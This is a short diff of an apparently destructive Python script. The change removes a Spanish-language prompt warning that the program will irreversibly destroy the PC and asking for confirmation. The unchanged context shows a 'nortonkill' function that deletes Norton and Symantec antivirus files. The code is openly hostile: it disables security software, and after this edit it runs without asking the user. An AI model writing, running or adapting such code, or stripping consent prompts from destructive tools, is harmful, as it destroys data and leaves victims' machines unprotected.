@@ -3,10 +3,6 @@ import os
 import sys
 import random
 
-print("Estás seguro de que quieres destruir este PC? (Esto es irreversible) ¿S/n?")
-if input() == "S":
-    print("Comenzando...")
-
 def nortonkill():
     os.remove('c:\\program files\\symantec shared')
     os.remove('c:\\program files\\Norton AntiVirus\\V32scan.dll')
